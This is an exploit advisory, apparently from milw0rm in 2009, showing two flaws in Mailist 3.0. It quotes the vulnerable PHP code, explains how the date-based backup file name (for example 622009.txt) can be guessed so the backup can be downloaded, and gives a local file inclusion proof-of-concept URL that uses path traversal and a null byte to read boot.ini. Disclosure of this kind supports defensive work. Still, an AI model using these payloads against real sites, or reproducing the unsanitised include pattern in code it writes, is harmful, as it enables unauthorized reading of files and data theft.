@@ -1,0 +1,81 @@
+#############################################################################################
+[+] Mailist 3.0 Insecure Backup/Local File Inclusion
+[+] Discovered By SirGod
+[+] www.mortal-team.org
+[+] www.h4cky0u.org
+[+] www.hellzone.info
+[+] www.anti-intruders.org
+#############################################################################################
+
+[+] Homepage : http://ninjadesigns.co.uk/
+
+[+] Download : http://ninjadesigns.co.uk/enter/mailist.zip
+
+
+[+] Insecure Backup
+
+ - Vulnerable code in admin.php
+
+
+---------------------------------------------------------------------
+
+
+if (isset($_GET['backup'])){
+	echo "<br>";
+	$file = 'maillist.php';
+	$newfile = 'backups/'.date("jnY").'.txt';
+	copy($file, $newfile);
+	echo 'Successfully backed up. (backups/'.$newfile.')<br>';
+	echo '<a href="'.$_SERVER['PHP_SELF'].'">Hide</a><br>';
+}
+
+
+----------------------------------------------------------------------
+
+ We can see how its crated a backup : $newfile = 'backups/'.date("jnY").'.txt';
+ The date() function is used.
+
+    n -	Numeric representation of a month, without leading zeros
+    j -	Day of the month without leading zeros
+    Y -	A full numeric representation of a year, 4 digits
+
+ So we can guess the database backup if we know when was created.
+
+   Example : 622009.txt
+
+        6 - the day without leading 0
+        2 - the month without leading 0
+        2009 - the year
+
+   PoC :  http://127.0.0.1/path/backups/622009.txt
+
+
+
+[+] Local File Inclusion
+
+
+ - Vulnerable code in send.php :
+
+---------------------------------------------------------------------
+
+if(isset($load)){
+
+include("outbox/".$load.".txt");
+}
+
+
+---------------------------------------------------------------------
+
+ Example :
+
+   http://127.0.0.1/path/send.php?load=[Local File]%00
+
+ PoC :
+
+    http://127.0.0.1/path/send.php?load=../../../../boot.ini%00
+
+
+
+#############################################################################################
+
+# milw0rm.com [2009-02-06]
